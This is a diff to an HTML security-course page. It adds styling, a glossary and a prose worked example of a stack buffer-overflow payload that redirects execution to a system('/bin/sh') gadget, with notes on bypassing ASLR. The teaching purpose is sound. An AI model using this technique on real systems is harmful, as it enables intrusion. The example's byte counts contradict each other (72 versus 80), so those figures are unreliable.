@@ -254,6 +254,36 @@
     border-radius: 4px; font-size: 10px; color: #79c0ff; text-decoration: none; transition: all .2s;
   }
   .uc-refs a:hover { border-color: #58a6ff; color: #58a6ff; background: #0d1117; }
+  /* ── Use-case enrichment v2 ── */
+  .uc-overview { background: linear-gradient(135deg, #0d1117 0%, #161b22 100%); border: 1px solid #30363d;
+    border-left: 3px solid #58a6ff; border-radius: 10px; padding: 16px 18px; margin: 16px 0 20px; }
+  .uc-overview .uc-summary { font-size: 13px; color: #c9d1d9; line-height: 1.7; }
+  .uc-overview .uc-summary strong { color: #79c0ff; }
+  .uc-pipeline { margin-top: 14px; padding: 10px 12px; background: #0d1117; border: 1px solid #30363d;
+    border-radius: 6px; font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+    font-size: 11px; color: #7ee787; line-height: 1.6; white-space: pre-wrap; overflow-x: auto; }
+  .uc-metrics { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 10px; margin-top: 14px; }
+  .uc-metric { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 10px 12px; }
+  .uc-metric .uc-metric-label { font-size: 10px; color: #8b949e; text-transform: uppercase; letter-spacing: 0.5px; }
+  .uc-metric .uc-metric-value { font-size: 14px; color: #ffa657; font-weight: 600; margin-top: 4px; line-height: 1.4; }
+  .uc-extensions { margin-top: 14px; padding: 10px 12px; background: rgba(210, 168, 255, 0.06);
+    border: 1px solid rgba(210, 168, 255, 0.25); border-radius: 6px; font-size: 12px; color: #c9d1d9; line-height: 1.6; }
+  .uc-extensions strong { color: #d2a8ff; }
+  .uc-step .uc-intuition { margin-top: 8px; padding: 8px 10px; background: rgba(126, 231, 135, 0.08);
+    border-left: 2px solid #3fb950; border-radius: 4px; font-size: 12px; color: #c9d1d9; line-height: 1.55; display: none; }
+  .uc-step.active .uc-intuition { display: block; }
+  .uc-step .uc-intuition strong { color: #7ee787; }
+  .uc-step .uc-complexity { display: inline-block; margin-top: 8px; margin-right: 6px;
+    background: rgba(31, 111, 235, 0.15); border: 1px solid rgba(88, 166, 255, 0.35); border-radius: 4px;
+    padding: 2px 8px; font-size: 10px; color: #79c0ff; font-family: 'Cascadia Code', 'Consolas', monospace; }
+  .uc-step .uc-pitfall { margin-top: 8px; padding: 8px 10px; background: rgba(255, 123, 114, 0.08);
+    border-left: 2px solid #ff7b72; border-radius: 4px; font-size: 12px; color: #c9d1d9; line-height: 1.55; display: none; }
+  .uc-step.active .uc-pitfall { display: block; }
+  .uc-step .uc-pitfall strong { color: #ff7b72; }
+  .uc-step .uc-example { margin-top: 8px; padding: 8px 10px; background: rgba(255, 166, 87, 0.06);
+    border-left: 2px solid #ffa657; border-radius: 4px; font-size: 12px; color: #c9d1d9; line-height: 1.55; display: none; }
+  .uc-step.active .uc-example { display: block; }
+  .uc-step .uc-example strong { color: #ffa657; }
   .legend-close {
     position: absolute; top: 8px; right: 8px; background: none; border: none;
     color: #8b949e; font-size: 16px; cursor: pointer; line-height: 1; padding: 2px 6px;
@@ -318,30 +348,95 @@
   .unit-toggle { display: inline-block; width: 18px; transition: transform 0.2s; font-size: 12px; }
   .unit-group.collapsed .unit-toggle { transform: rotate(-90deg); }
   .appendix-table .watch-link { color: #ff4444; text-decoration: none; font-weight: 600; }
-  /* ── Practice Problems (Problem-First) ── */
+/* ── Practice Problems (Problem-First) ── */
   #problems-container { position: relative; top: 0; width: 100%; max-width: 1100px; margin: 0 auto; padding: 24px 16px 60px; }
   #view-problems { overflow-y: auto; height: calc(100vh - 50px); margin-top: 50px; }
-  .prob-intro { background: #161b22; border: 1px solid #30363d; border-left: 3px solid #7ee787; border-radius: 6px; padding: 14px 18px; margin-bottom: 22px; color: #c9d1d9; font-size: 14px; line-height: 1.6; }
+  .prob-intro { background: #161b22; border: 1px solid #30363d; border-left: 3px solid #7ee787; border-radius: 6px; padding: 14px 18px; margin-bottom: 18px; color: #c9d1d9; font-size: 14px; line-height: 1.6; }
   .prob-intro strong { color: #7ee787; }
-  .prob-section { margin-bottom: 22px; border: 1px solid #30363d; border-radius: 8px; background: #161b22; overflow: hidden; }
-  .prob-section > summary { padding: 14px 18px; font-size: 15px; font-weight: 600; color: #e6edf3; cursor: pointer; list-style: none; display: flex; align-items: center; gap: 10px; user-select: none; transition: background .15s; }
+  /* Toolbar */
+  .prob-toolbar { position: sticky; top: 0; z-index: 5; background: rgba(13,17,23,0.95); backdrop-filter: blur(6px); padding: 10px 0 12px; margin-bottom: 14px; border-bottom: 1px solid #21262d; display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
+  .prob-search { flex: 1 1 200px; min-width: 180px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 7px 12px; color: #c9d1d9; font-size: 13px; outline: none; }
+  .prob-search:focus { border-color: #58a6ff; }
+  .prob-filter-row { display: flex; flex-wrap: wrap; gap: 6px; align-items: center; }
+  .prob-chip { display: inline-flex; align-items: center; gap: 4px; font-size: 11px; font-weight: 600; padding: 4px 10px; border-radius: 12px; cursor: pointer; background: #161b22; border: 1px solid #30363d; color: #8b949e; text-transform: uppercase; letter-spacing: .4px; transition: all .15s; user-select: none; }
+  .prob-chip:hover { border-color: #58a6ff; color: #c9d1d9; }
+  .prob-chip.active { background: #1f6feb22; border-color: #58a6ff; color: #58a6ff; }
+  .prob-chip.design.active  { background: #58a6ff22; border-color: #58a6ff; color: #58a6ff; }
+  .prob-chip.derive.active  { background: #ffa65722; border-color: #ffa657; color: #ffa657; }
+  .prob-chip.debug.active   { background: #f8514922; border-color: #f85149; color: #f85149; }
+  .prob-chip.code.active    { background: #7ee78722; border-color: #7ee787; color: #7ee787; }
+  .prob-chip.paper.active   { background: #d2a8ff22; border-color: #d2a8ff; color: #d2a8ff; }
+  .prob-chip .count { font-size: 9px; opacity: .7; font-weight: 500; }
+  .prob-actbtn { background: #161b22; border: 1px solid #30363d; color: #c9d1d9; padding: 6px 12px; border-radius: 6px; font-size: 12px; cursor: pointer; transition: all .15s; }
+  .prob-actbtn:hover { border-color: #58a6ff; color: #58a6ff; }
+  .prob-actbtn.primary { background: #1f6feb; border-color: #58a6ff; color: #fff; }
+  .prob-actbtn.primary:hover { background: #388bfd; }
+  .prob-progress { display: flex; align-items: center; gap: 10px; flex: 0 0 auto; font-size: 11px; color: #8b949e; margin-left: auto; }
+  .prob-progress-bar { width: 100px; height: 6px; background: #21262d; border-radius: 3px; overflow: hidden; }
+  .prob-progress-fill { height: 100%; background: linear-gradient(90deg, #7ee787, #58a6ff); transition: width .3s; }
+  /* Sections */
+  .prob-section { margin-bottom: 16px; border: 1px solid #30363d; border-radius: 8px; background: #161b22; overflow: hidden; }
+  .prob-section > summary { padding: 13px 18px; font-size: 14px; font-weight: 600; color: #e6edf3; cursor: pointer; list-style: none; display: flex; align-items: center; gap: 10px; user-select: none; transition: background .15s; flex-wrap: wrap; }
   .prob-section > summary::-webkit-details-marker { display: none; }
   .prob-section > summary::before { content: '▸'; color: #8b949e; font-size: 11px; transition: transform .2s; }
   .prob-section[open] > summary::before { transform: rotate(90deg); }
   .prob-section > summary:hover { background: rgba(88,166,255,0.04); }
-  .prob-section .wk { color: #8b949e; font-size: 12px; font-weight: 500; background: #0d1117; padding: 2px 8px; border-radius: 10px; border: 1px solid #30363d; }
-  .prob-body { padding: 6px 20px 18px 40px; }
-  .prob-body > ol { padding-left: 22px; margin: 8px 0 4px; }
-  .prob-body > ol > li { margin: 12px 0; color: #c9d1d9; font-size: 14px; line-height: 1.55; }
-  .prob-body > ol > li::marker { color: #7ee787; font-weight: 600; }
-  .prob-hint { display: block; margin-top: 4px; color: #8b949e; font-size: 12.5px; font-style: italic; }
-  .prob-hint::before { content: '💡 '; font-style: normal; }
-  .prob-tag { display: inline-block; font-size: 10px; font-weight: 600; padding: 1px 7px; border-radius: 8px; margin-right: 6px; vertical-align: middle; text-transform: uppercase; letter-spacing: .4px; }
+  .prob-section .wk { color: #8b949e; font-size: 11px; font-weight: 500; background: #0d1117; padding: 2px 8px; border-radius: 10px; border: 1px solid #30363d; }
+  .prob-section .sec-meta { margin-left: auto; font-size: 11px; color: #6e7681; font-weight: 500; }
+  .prob-section .sec-meta .done-count { color: #7ee787; font-weight: 600; }
+  .prob-hook { background: #0d1117; border-bottom: 1px solid #21262d; padding: 12px 22px; font-size: 13px; color: #d2a8ff; font-style: italic; line-height: 1.6; display: flex; gap: 8px; align-items: flex-start; }
+  .prob-hook::before { content: '🪝'; font-style: normal; flex-shrink: 0; }
+  .prob-body { padding: 12px 18px 16px; display: flex; flex-direction: column; gap: 10px; }
+  /* Problem cards */
+  .prob-card { background: #0d1117; border: 1px solid #21262d; border-radius: 8px; padding: 12px 14px; transition: all .15s; position: relative; }
+  .prob-card:hover { border-color: #30363d; }
+  .prob-card.status-thinking { border-left: 3px solid #d2a8ff; }
+  .prob-card.status-got      { border-left: 3px solid #7ee787; opacity: .75; }
+  .prob-card.status-stuck    { border-left: 3px solid #f85149; }
+  .prob-card.hidden          { display: none; }
+  .prob-card .pc-head { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 4px; }
+  .prob-card .pc-num { color: #6e7681; font-size: 11px; font-weight: 600; font-family: 'Cascadia Code', monospace; }
+  .prob-card .pc-star { color: #ffa657; font-size: 13px; }
+  .prob-tag { display: inline-block; font-size: 10px; font-weight: 700; padding: 2px 8px; border-radius: 8px; text-transform: uppercase; letter-spacing: .4px; }
   .prob-tag.design { background: #58a6ff20; color: #58a6ff; }
   .prob-tag.debug  { background: #f8514920; color: #f85149; }
   .prob-tag.paper  { background: #d2a8ff20; color: #d2a8ff; }
   .prob-tag.code   { background: #7ee78720; color: #7ee787; }
   .prob-tag.derive { background: #ffa65720; color: #ffa657; }
+  .prob-card .pc-text { color: #c9d1d9; font-size: 13.5px; line-height: 1.6; margin: 2px 0 6px; }
+  .prob-card .pc-actions { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; margin-top: 6px; }
+  .prob-revealbtn { background: transparent; border: 1px dashed #30363d; color: #8b949e; padding: 3px 10px; border-radius: 12px; font-size: 11px; cursor: pointer; transition: all .15s; }
+  .prob-revealbtn:hover { border-color: #d2a8ff; color: #d2a8ff; border-style: solid; }
+  .prob-revealbtn.approach:hover { border-color: #79c0ff; color: #79c0ff; }
+  .prob-revealbtn.answer:hover   { border-color: #7ee787; color: #7ee787; }
+  .prob-reveal-panel { display: none; margin-top: 8px; padding: 10px 14px; background: #161b22; border-radius: 4px; color: #c9d1d9; font-size: 12.5px; line-height: 1.65; }
+  .prob-reveal-panel.shown { display: block; }
+  .prob-reveal-panel ul, .prob-reveal-panel ol { margin: 4px 0 4px 18px; padding: 0; }
+  .prob-reveal-panel li { margin: 3px 0; }
+  .prob-reveal-panel code { background: #0d1117; padding: 1px 5px; border-radius: 3px; font-size: 11.5px; color: #79c0ff; font-family: 'Cascadia Code', 'Consolas', monospace; }
+  .prob-reveal-panel strong { color: #e6edf3; }
+  .prob-reveal-panel .rh-label { display: inline-block; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: .6px; margin-right: 8px; padding: 1px 6px; border-radius: 4px; vertical-align: middle; }
+  .prob-hint     { border-left: 2px solid #d2a8ff; }
+  .prob-hint     .rh-label { background: #d2a8ff22; color: #d2a8ff; }
+  .prob-approach { border-left: 2px solid #79c0ff; }
+  .prob-approach .rh-label { background: #79c0ff22; color: #79c0ff; }
+  .prob-answer   { border-left: 2px solid #7ee787; background: #0d1f17; }
+  .prob-answer   .rh-label { background: #7ee78722; color: #7ee787; }
+  .prob-status-btns { display: flex; gap: 4px; margin-left: auto; }
+  .prob-statbtn { background: transparent; border: 1px solid #30363d; color: #6e7681; padding: 3px 9px; border-radius: 12px; font-size: 11px; cursor: pointer; transition: all .15s; }
+  .prob-statbtn:hover { border-color: #58a6ff; color: #c9d1d9; }
+  .prob-statbtn.active.thinking { background: #d2a8ff22; border-color: #d2a8ff; color: #d2a8ff; }
+  .prob-statbtn.active.got      { background: #7ee78722; border-color: #7ee787; color: #7ee787; }
+  .prob-statbtn.active.stuck    { background: #f8514922; border-color: #f85149; color: #f85149; }
+  .prob-empty { text-align: center; padding: 40px 20px; color: #6e7681; font-size: 13px; }
+  /* Modal for surprise-me */
+  .prob-spotlight { position: fixed; inset: 0; background: rgba(13,17,23,0.85); backdrop-filter: blur(4px); display: none; align-items: center; justify-content: center; z-index: 100; padding: 20px; }
+  .prob-spotlight.open { display: flex; }
+  .prob-spotlight-card { background: #161b22; border: 1px solid #58a6ff; border-radius: 12px; max-width: 600px; width: 100%; padding: 24px 28px; box-shadow: 0 12px 60px rgba(88,166,255,0.3); }
+  .prob-spotlight-card h3 { color: #58a6ff; font-size: 14px; margin: 0 0 4px; text-transform: uppercase; letter-spacing: 1px; }
+  .prob-spotlight-card .pc-text { font-size: 16px; line-height: 1.55; color: #e6edf3; margin: 10px 0; }
+  .prob-spotlight-card .sl-close { background: transparent; border: none; color: #8b949e; font-size: 22px; cursor: pointer; float: right; line-height: 1; }
+  .prob-spotlight-card .sl-close:hover { color: #c9d1d9; }
   .appendix-table .watch-link:hover { color: #ff0000; text-decoration: underline; }
 
   /* ── Mobile ── */
@@ -390,6 +485,233 @@
     .dd-card-img { height: 120px; }
     .dd-keypoints { grid-template-columns: 1fr; }
   }
+
+/* === BEGIN glossary v1 css === */
+  /* dd-nav sticky top */
+  .dd-nav.dd-nav-top {
+    position: sticky; top: 0; z-index: 5;
+    margin: -4px -4px 14px; padding: 10px 8px;
+    background: linear-gradient(180deg, rgba(13,17,23,0.96) 75%, rgba(13,17,23,0));
+    backdrop-filter: blur(4px);
+    border-bottom: 1px solid #21262d;
+  }
+  /* ── Glossary ── */
+  .gloss-intro { background: #161b22; border: 1px solid #30363d; border-left: 3px solid #d2a8ff; border-radius: 6px; padding: 14px 18px; margin-bottom: 14px; color: #c9d1d9; font-size: 14px; line-height: 1.6; }
+  .gloss-intro strong { color: #d2a8ff; }
+  #view-glossary { overflow-y: auto; height: calc(100vh - 50px); margin-top: 50px; padding: 20px; box-sizing: border-box; }
+  @media (max-width: 768px) { #view-glossary { margin-top: 48px; padding: 12px; } }
+  .glossary-controls { position: sticky; top: 0; z-index: 5; background: rgba(13,17,23,0.95); backdrop-filter: blur(6px); padding: 10px 0 12px; margin: -8px 0 14px; border-bottom: 1px solid #21262d; display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
+  #glossary-search { flex: 1 1 240px; min-width: 200px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 7px 12px; color: #c9d1d9; font-size: 13px; outline: none; }
+  #glossary-search:focus { border-color: #58a6ff; }
+  .glossary-cat-pills { display: flex; flex-wrap: wrap; gap: 6px; align-items: center; }
+  .glossary-cat-pills button { background: #161b22; border: 1px solid #30363d; color: #8b949e; padding: 4px 10px; border-radius: 12px; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: .4px; cursor: pointer; transition: all .15s; }
+  .glossary-cat-pills button:hover { border-color: #58a6ff; color: #c9d1d9; }
+  .glossary-cat-pills button.active { background: var(--pill-bg, #1f6feb22); border-color: var(--pill-color, #58a6ff); color: var(--pill-color, #58a6ff); }
+  .glossary-count { font-size: 11px; color: #8b949e; margin-left: auto; }
+  .glossary-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 14px; max-width: 1400px; margin: 0 auto; }
+  .glossary-card { background: #161b22; border: 1px solid #30363d; border-radius: 10px; padding: 14px; transition: border-color .15s, box-shadow .15s, transform .15s; }
+  .glossary-card:hover { border-color: var(--cat-color, #58a6ff); box-shadow: 0 4px 14px rgba(0,0,0,0.35); }
+  .glossary-card.flash {
+    animation: glossary-flash 2.6s cubic-bezier(.4,0,.2,1) 1 forwards;
+    position: relative;
+    z-index: 2;
+  }
+  @keyframes glossary-flash {
+    0% {
+      background: #161b22;
+      border-color: #30363d;
+      box-shadow: 0 0 0 rgba(0,0,0,0);
+      transform: scale(1);
+    }
+    8% {
+      background: color-mix(in srgb, var(--cat-color, #58a6ff) 55%, #161b22);
+      border-color: var(--cat-color, #58a6ff);
+      box-shadow:
+        0 0 0 4px var(--cat-color, #58a6ff),
+        0 0 28px 6px color-mix(in srgb, var(--cat-color, #58a6ff) 70%, transparent),
+        0 14px 36px rgba(0,0,0,0.55);
+      transform: scale(1.045);
+    }
+    22% {
+      background: color-mix(in srgb, var(--cat-color, #58a6ff) 30%, #161b22);
+      border-color: var(--cat-color, #58a6ff);
+      box-shadow:
+        0 0 0 3px var(--cat-color, #58a6ff),
+        0 0 22px 4px color-mix(in srgb, var(--cat-color, #58a6ff) 55%, transparent),
+        0 10px 28px rgba(0,0,0,0.5);
+      transform: scale(1.03);
+    }
+    45% {
+      background: color-mix(in srgb, var(--cat-color, #58a6ff) 45%, #161b22);
+      border-color: var(--cat-color, #58a6ff);
+      box-shadow:
+        0 0 0 3px var(--cat-color, #58a6ff),
+        0 0 26px 5px color-mix(in srgb, var(--cat-color, #58a6ff) 60%, transparent),
+        0 12px 32px rgba(0,0,0,0.5);
+      transform: scale(1.035);
+    }
+    70% {
+      background: color-mix(in srgb, var(--cat-color, #58a6ff) 22%, #161b22);
+      border-color: color-mix(in srgb, var(--cat-color, #58a6ff) 80%, #30363d);
+      box-shadow:
+        0 0 0 2px color-mix(in srgb, var(--cat-color, #58a6ff) 70%, transparent),
+        0 0 18px 3px color-mix(in srgb, var(--cat-color, #58a6ff) 40%, transparent);
+      transform: scale(1.015);
+    }
+    100% {
+      background: #161b22;
+      border-color: #30363d;
+      box-shadow: 0 0 0 rgba(0,0,0,0);
+      transform: scale(1);
+    }
+  }
+  /* Fallback for browsers without color-mix: solid tinted backgrounds */
+  @supports not (background: color-mix(in srgb, red, blue)) {
+    @keyframes glossary-flash {
+      0%,100% { background: #161b22; border-color: #30363d; box-shadow: none; transform: scale(1); }
+      8%, 45% {
+        background: rgba(88,166,255,0.32);
+        border-color: var(--cat-color, #58a6ff);
+        box-shadow: 0 0 0 4px var(--cat-color, #58a6ff), 0 0 28px var(--cat-color, #58a6ff);
+        transform: scale(1.04);
+      }
+    }
+  }
+  .glossary-term-row { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+  .glossary-term { font-size: 16px; font-weight: 700; color: #e6edf3; }
+  .glossary-cat-badge { font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: .5px; padding: 2px 7px; border-radius: 10px; border: 1px solid var(--cat-color, #58a6ff); color: var(--cat-color, #58a6ff); background: rgba(0,0,0,0.2); }
+  .glossary-aka { font-size: 11px; color: #8b949e; font-style: italic; margin-top: 3px; }
+  .glossary-short { font-size: 13px; color: #c9d1d9; margin-top: 8px; line-height: 1.5; }
+  .glossary-long { font-size: 13px; color: #8b949e; margin-top: 8px; line-height: 1.55; display: none; }
+  .glossary-long code { background: #0d1117; border: 1px solid #21262d; border-radius: 4px; padding: 1px 5px; font-family: 'Cascadia Code', monospace; font-size: 12px; color: #d2a8ff; }
+  .glossary-card.expanded .glossary-long { display: block; }
+  .glossary-toggle { background: none; border: none; color: #58a6ff; font-size: 11px; cursor: pointer; padding: 6px 0 0; }
+  .glossary-toggle:hover { text-decoration: underline; }
+  .glossary-links { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px; }
+  .glossary-links button { background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; padding: 3px 9px; border-radius: 10px; font-size: 11px; cursor: pointer; transition: all .15s; }
+  .glossary-links button:hover { border-color: #58a6ff; color: #58a6ff; }
+  /* graph-node pulse when jumped to from glossary */
+  @keyframes glossary-pulse {
+    0%   { stroke-opacity: 1; stroke-width: 14; }
+    100% { stroke-opacity: 0.55; stroke-width: 5; }
+  }
+  @keyframes glossary-halo-pulse {
+    0%   { r: 16;  stroke-opacity: 1;    stroke-width: 10; }
+    60%  { r: 90;  stroke-opacity: 0.55; stroke-width: 5; }
+    100% { r: 140; stroke-opacity: 0;    stroke-width: 2; }
+  }
+  @keyframes glossary-halo-pulse-2 {
+    0%   { r: 16;  stroke-opacity: 0.9; stroke-width: 6; }
+    60%  { r: 110; stroke-opacity: 0.4; stroke-width: 3; }
+    100% { r: 170; stroke-opacity: 0;   stroke-width: 1.5; }
+  }
+  @keyframes glossary-fill-pulse {
+    0%, 100% { fill-opacity: 0.85; }
+    50%      { fill-opacity: 1; }
+  }
+  @keyframes glossary-dim-others {
+    0%   { opacity: 1; }
+    20%  { opacity: 0.15; }
+    100% { opacity: 0.15; }
+  }
+  /* Dim everything in the graph except the highlighted node + its halos */
+  #canvas-graph.glossary-spotlight g.graph-node:not(.glossary-highlight),
+  #canvas-graph.glossary-spotlight line.graph-link,
+  #canvas-graph.glossary-spotlight text.graph-link-label {
+    animation: glossary-dim-others 0.4s ease-out forwards;
+  }
+  #canvas-graph.glossary-spotlight g.graph-node.glossary-highlight {
+    opacity: 1 !important;
+  }
+  g.graph-node.glossary-highlight circle:not(.glossary-halo):not(.glossary-halo-outer) {
+    animation:
+      glossary-pulse 0.45s ease-in-out 10 alternate,
+      glossary-fill-pulse 0.45s ease-in-out 10 alternate;
+    stroke: #ffd13b !important;
+    fill: #ffd13b !important;
+    filter:
+      drop-shadow(0 0 10px #ffd13b)
+      drop-shadow(0 0 24px #ffd13baa)
+      drop-shadow(0 0 40px #ffd13b66);
+  }
+  g.graph-node.glossary-highlight text {
+    fill: #fff !important;
+    font-weight: 900 !important;
+    font-size: 15px !important;
+    paint-order: stroke fill;
+    stroke: #5a3a00;
+    stroke-width: 4px;
+    stroke-linejoin: round;
+    filter:
+      drop-shadow(0 0 6px #000)
+      drop-shadow(0 0 12px #ffd13b)
+      drop-shadow(0 0 20px #ffd13bcc);
+  }
+  circle.glossary-halo {
+    fill: none;
+    stroke: #ffd13b;
+    pointer-events: none;
+    animation: glossary-halo-pulse 1.1s ease-out 5;
+    filter: drop-shadow(0 0 8px #ffd13baa);
+  }
+  circle.glossary-halo-outer {
+    fill: none;
+    stroke: #ffae00;
+    pointer-events: none;
+    animation: glossary-halo-pulse-2 1.4s ease-out 5;
+    animation-delay: 0.18s;
+    filter: drop-shadow(0 0 12px #ffae0099);
+  }
+  /* mindmap pulse (uses a <circle> appended) */
+  circle.glossary-mm-halo {
+    fill: none;
+    stroke: #ffd13b;
+    pointer-events: none;
+    animation: glossary-halo-pulse 1.1s ease-out 5;
+    filter: drop-shadow(0 0 8px #ffd13baa);
+  }
+  circle.glossary-mm-halo-outer {
+    fill: none;
+    stroke: #ffae00;
+    pointer-events: none;
+    animation: glossary-halo-pulse-2 1.4s ease-out 5;
+    animation-delay: 0.18s;
+    filter: drop-shadow(0 0 12px #ffae0099);
+  }
+  /* toast banner shown when jumping from glossary */
+  #glossary-toast {
+    position: fixed; top: 60px; left: 50%; transform: translateX(-50%) translateY(-30px) scale(0.92);
+    background: linear-gradient(180deg, #2a1f0a, #1a1308);
+    border: 2px solid #ffd13b; border-left: 6px solid #ffd13b;
+    color: #fff5d6; padding: 12px 22px; border-radius: 10px;
+    font-size: 15px; font-weight: 700;
+    box-shadow:
+      0 10px 32px rgba(0,0,0,0.6),
+      0 0 36px rgba(255,209,59,0.45),
+      0 0 64px rgba(255,209,59,0.25);
+    opacity: 0; pointer-events: none;
+    transition: opacity .22s ease, transform .28s cubic-bezier(.2,1.2,.4,1);
+    z-index: 10000;
+    display: flex; align-items: center; gap: 12px;
+    max-width: 90vw;
+    text-shadow: 0 0 8px rgba(255,209,59,0.5);
+  }
+  #glossary-toast.show { opacity: 1; transform: translateX(-50%) translateY(0) scale(1); }
+  #glossary-toast .gt-icon { font-size: 22px; filter: drop-shadow(0 0 6px #ffd13b); }
+  #glossary-toast .gt-sub { color: #c9b88c; font-weight: 500; font-size: 12.5px; margin-left: 4px; }
+  #glossary-toast strong { color: #ffd13b; text-shadow: 0 0 10px rgba(255,209,59,0.6); }
+  @media (max-width: 768px) { #glossary-toast { top: 56px; font-size: 13px; padding: 10px 16px; } }
+  /* tooltip glossary footer link */
+  #tooltip .tt-glossary { margin-top: 6px; padding-top: 5px; border-top: 1px solid #30363d; }
+  #tooltip .tt-glossary:empty { display: none; }
+  #tooltip .tt-glossary a {
+    display: inline-block; padding: 2px 8px; border-radius: 4px;
+    background: rgba(210,168,255,0.10); color: #d2a8ff; text-decoration: none;
+    font-size: 11px; font-weight: 500; cursor: pointer; border: 1px solid rgba(210,168,255,0.25);
+  }
+  #tooltip .tt-glossary a:hover { background: rgba(210,168,255,0.22); border-color: #d2a8ff; }
+  #tooltip.has-glossary { pointer-events: auto; }
+/* === END glossary v1 css === */
 </style>
 </head>
 <body>
@@ -450,6 +772,21 @@
 <div id="view-problems" class="view">
   <div id="problems-container"></div>
 </div>
+<!-- BEGIN glossary v1 view -->
+<div id="view-glossary" class="view">
+  <div class="gloss-intro">
+    <strong>📖 Glossary.</strong> Every acronym, jargon term, and unit-of-art used across <em>Use Cases</em> and <em>Deep Dives</em> — defined here, cross-linked to the <strong>Topic Graph</strong> and <strong>Mind Map</strong> so you can jump from definition → diagram in one click.
+    <br><br>
+    <span style="color:#8b949e">Tip: click a related term to flash-jump to it. Click the 🌐 graph or 🧭 mindmap links to spotlight that node on its tab.</span>
+  </div>
+  <div class="glossary-controls">
+    <input type="text" id="glossary-search" placeholder="🔍 Search terms, acronyms, or definitions…" />
+    <div class="glossary-cat-pills" id="glossary-cat-pills"></div>
+    <span class="glossary-count" id="glossary-count"></span>
+  </div>
+  <div id="glossary-list" class="glossary-list"></div>
+</div>
+<!-- END glossary v1 view -->
 
 <!-- ═══════════════ SHARED OVERLAYS ═══════════════ -->
 <div id="tooltip"><div class="tt-title"></div><div class="tt-body"></div><div class="tt-slides"></div></div>
@@ -898,7 +1235,7 @@ const COURSE_CONFIG = {
 
   deepDives: [
     {
-      id: 'dd-bufoverflow', num: 'Concept 1 of 5', title: 'Buffer Overflow & Stack Smashing',
+      id: 'dd-bufoverflow', num: 'Concept 1 of 8', title: 'Buffer Overflow & Stack Smashing',
       desc: 'The classic memory exploit — overwrite the return address to hijack control flow.', color: '#f778ba', icon: '💥',
       svg: function(w, h) {
         var m = 30, cw = w - 2*m, ch = h - 2*m;
@@ -934,17 +1271,21 @@ const COURSE_CONFIG = {
         { title: 'How It Works', text: 'When a C function uses a fixed-size buffer on the stack (e.g., char buf[64]) and copies user input without bounds checking (strcpy, gets), the attacker can write past the buffer boundary. This overwrites the saved frame pointer (SFP) and the return address (RIP) on the stack. When the function returns, the CPU jumps to the attacker-controlled address instead of the legitimate caller.' },
         { title: 'The Exploit Chain', text: '① Attacker sends input larger than the buffer. ② The overflow overwrites the return address with the address of injected shellcode (or a known function like system()). ③ When the function executes "ret", EIP is set to the attacker\'s address. ④ Shellcode executes with the privileges of the vulnerable program.' },
         { title: 'Key Formula', formula: 'offset = &buf + sizeof(buf) + sizeof(SFP) → points to RIP on stack' },
-        { title: 'Mitigations', text: 'Stack canaries detect overwrites before the function returns. W⊕X (NX/DEP) prevents executing injected code on the stack. ASLR randomizes memory layout so the attacker can\'t predict addresses. Using memory-safe languages (Rust, Go, Java) eliminates the bug class entirely.' }
+        { title: 'Mitigations', text: 'Stack canaries detect overwrites before the function returns. W⊕X (NX/DEP) prevents executing injected code on the stack. ASLR randomizes memory layout so the attacker can\'t predict addresses. Using memory-safe languages (Rust, Go, Java) eliminates the bug class entirely.' },
+        { title: 'Worked Example — 72-byte Payload', text: 'Suppose char buf[64] sits below an 8-byte saved EBP and an 8-byte return address (x86-64). The attacker sends 64 \'A\'s to fill the buffer, 8 \'B\'s to clobber the saved EBP, then 8 little-endian bytes pointing to 0x4011a6 (a libc system("/bin/sh") gadget found via objdump or pwntools). Total payload = 80 bytes. Without ASLR the address is constant; with PIE+ASLR the attacker first leaks an address (format-string, info disclosure) and then computes the offset.' },
+        { title: 'Real-World Tie-Ins', text: 'The 1988 Morris Worm exploited a fingerd gets() overflow — the original textbook case. CVE-2014-0160 (Heartbleed) was a heap over-read in OpenSSL. CVE-2017-0144 (EternalBlue) was an SMBv1 kernel buffer overflow weaponized by WannaCry/NotPetya. Even with canaries+W⊕X+ASLR, ROP chains (next concept) can still bypass — the arms race is alive.' }
       ],
       keypoints: [
         { title: 'Root Cause', text: 'C/C++ perform no automatic bounds checking on array accesses.' },
         { title: 'Attacker Goal', text: 'Overwrite the return address to redirect execution to attacker-controlled code.' },
         { title: 'Classic Functions', text: 'gets(), strcpy(), sprintf() — all copy without length limits.' },
-        { title: 'Defense Layers', text: 'Canaries + W⊕X + ASLR together make exploitation much harder (defense in depth).' }
+        { title: 'Defense Layers', text: 'Canaries + W⊕X + ASLR together make exploitation much harder (defense in depth).' },
+        { title: 'Canary Strength', text: 'GCC -fstack-protector-strong inserts a 64-bit random canary on x86-64; one byte is 0x00 to stop string-copy leaks.' },
+        { title: 'CWE-121 / OWASP A03', text: 'Buffer overflow = CWE-121 (stack) / CWE-122 (heap); injection family is OWASP Top-10 A03:2021.' }
       ]
     },
     {
-      id: 'dd-aes', num: 'Concept 2 of 5', title: 'AES & Symmetric Encryption',
+      id: 'dd-aes', num: 'Concept 2 of 8', title: 'AES & Symmetric Encryption',
       desc: 'The workhorse of modern cryptography — how AES encrypts data and why modes matter.', color: '#7ee787', icon: '🔐',
       svg: function(w, h) {
         var s = '<svg viewBox="0 0 '+w+' '+h+'" xmlns="http://www.w3.org/2000/svg" style="background:#0d1117">';
@@ -990,17 +1331,20 @@ const COURSE_CONFIG = {
